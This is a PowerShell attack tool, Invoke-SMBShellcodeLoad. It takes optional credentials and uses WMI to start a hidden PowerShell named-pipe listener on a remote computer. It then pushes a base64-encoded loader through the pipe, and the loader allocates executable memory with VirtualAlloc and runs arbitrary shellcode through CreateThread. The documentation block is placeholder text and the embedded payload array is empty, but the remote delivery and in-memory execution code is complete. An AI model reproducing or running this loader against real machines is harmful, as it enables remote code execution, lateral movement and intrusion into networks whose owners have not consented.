function Invoke-SMBShellcodeLoad {
    <#
    .SYNOPSIS
    Short description
    
    .DESCRIPTION
    Long description
    
    .EXAMPLE
    An example
    
    .NOTES
    General notes
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$PipeName,

        [Parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [byte[]]$Shellcode,

        [parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        [parameter(Mandatory=$false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$Pass
    )

    $commonArgs = @{}
    $commonArgs['ComputerName'] = $ComputerName

    if ($PSCmdlet.ParameterSetName -eq "Credentials") {
        Write-Verbose "[+] Credentials used, creating PSCredential"
        $secPassword = $Pass | ConvertTo-SecureString -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$secPassword

        $commonArgs['Credential'] = $credential
    }

    if (-not $PSBoundParameters['shellcode']) {
        Write-Verbose "[+] Shellcode parameter not used, using embedded payload"
        $shellcode = $inlinesc
    } 

    $encSC = [Convert]::ToBase64String($shellcode)
    #Shellcode loader scriptblock
    $shellcodeLoader = {
        $DoIt = @'
Function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
        
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
        
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
    Write-Output $TypeBuilder.CreateType()
}

$base64payload = 'ENCODEDx86SChere'
$code = [Convert]::FromBase64String($base64payload)

$SystemAssembly = [Uri].Assembly
$mscorlibAssembly = [object].Assembly
$WindowsBase = [System.Reflection.Assembly]::LoadWithPartialName('WindowsBase')
$UnsafeNativeMethods = $WindowsBase.GetType('MS.Win32.UnsafeNativeMethods')
$Win32UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
$MicrosoftWin32Native = $mscorlibAssembly.GetType('Microsoft.Win32.Win32Native')

$SafeWaitHandle = [Microsoft.Win32.SafeHandles.SafeWaitHandle]
$GetProcAddress = $MicrosoftWin32Native.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]'NonPublic, Static')

$kernel32Handle = $Win32UnsafeNativeMethods::GetModuleHandle("Kernel32.dll")
$CreateThreadDelegateType = Get-DelegateType @([Uint32], [Uint32], [IntPtr], [IntPtr], [Uint32], [IntPtr]) ([IntPtr])
$CreateThreadAddr = $GetProcAddress.Invoke($null, @($kernel32Handle, "CreateThread"))
$CreateThread =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegateType)

$VirtualAlloc = $UnsafeNativeMethods.GetMethod('VirtualAlloc', [System.Reflection.BindingFlags]'NonPublic, Static')

#allocate memory
$dwSize = New-Object System.UIntPtr $($code.Length + 1)
$address = $VirtualAlloc.Invoke($null, @([IntPtr]::Zero, [UIntPtr]$dwSize, (0x1000 -bor 0x2000), 0x40))

#copy code
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $address, $code.Length)

#CreateThread
$threadPtr = $CreateThread.Invoke(0, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)

#WaitForSingleObject
$handle = $SafeWaitHandle::new($threadPtr, $true)
$null = $UnsafeNativeMethods::WaitForSingleObject($handle, 0xFFFFFFFF)
'@
        $DoIt = $DoIt -replace 'ENCODEDx86SChere',$encSC
        if ([IntPtr]::Size -eq 8) {
            Start-Job { param($a) Invoke-Expression $a } -RunAs32 -Argument $DoIt | Wait-Job | Receive-Job
        }
        else {
            Invoke-Expression $DoIt
        }
    }

    $temp = [System.Text.Encoding]::UTF8.GetBytes($shellcodeLoader)
    $B64InjectBlock = [System.Convert]::ToBase64String($temp)

    $cmd = "powershell -w 1 -c `"`$null=[reflection.Assembly]::LoadWithPartialName('system.core');`$p=new-object System.IO.Pipes.NamedPipeServerStream('\\.\$PipeName');`$p.WaitForConnection();`$c=(new-object System.IO.StreamReader(`$p)).ReadToEnd();`$p.Dispose();`$runner = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$c))); `$runner | Invoke-Expression;`""

    $wmiMethodArgs = @{
        Namespace = 'root\cimv2'
        Class = 'Win32_Process'
        Name = 'Create'
        ArgumentList = $cmd
    }

    Write-Verbose "[+] Attempting to start Named Pipe server on $ComputerName"
    try {
        Invoke-WmiMethod @wmiMethodArgs @commonArgs
    }
    catch {
        $_
        break
    }

    Start-Sleep -Seconds 10
    Write-Verbose "[+] Connecting to named pipe server on $ComputerName"
    $pipe = new-object System.IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName)
    $pipe.Connect()
    $sw = new-object System.IO.StreamWriter($pipe)

    Write-Verbose "[+] Sending PowerShell payload to $ComputerName"
    $sw.WriteLine($B64InjectBlock)
    $sw.Dispose();
    $pipe.Dispose();
}

$inlinesc = @()